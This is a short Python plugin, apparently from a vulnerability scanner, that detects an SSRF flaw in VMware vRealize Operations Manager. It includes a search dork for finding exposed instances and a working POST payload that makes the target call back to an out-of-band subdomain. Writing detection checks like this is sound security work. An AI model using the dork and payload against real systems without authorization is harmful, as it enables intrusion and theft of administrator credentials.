# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "VMware vRealize&Cloud Foundation SSRF漏洞",
        "dork": "title=\"vRealize Operations Manager\"",
        "description": "vRealize Operations Manager API中存在一个服务器端请求伪造漏洞，其CVSS评分为8.6。具有vRealize Operations Manager API网络访问权限攻击者可以通过利用此漏洞执行服务器端请求伪造攻击，以窃取管理员凭据。",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            r = self.request(
                method='POST',
                path=f'./casa/nodes/thumbprints',
                timeout=15,
                headers={
                    "Content-Type": "application/json;charset=UTF-8"
                },
                data=f'["{subdomain}"]'
            )
            if r.status_code == 200 and execute.verify():
                return {"LoopholeInfo": self.__info__}
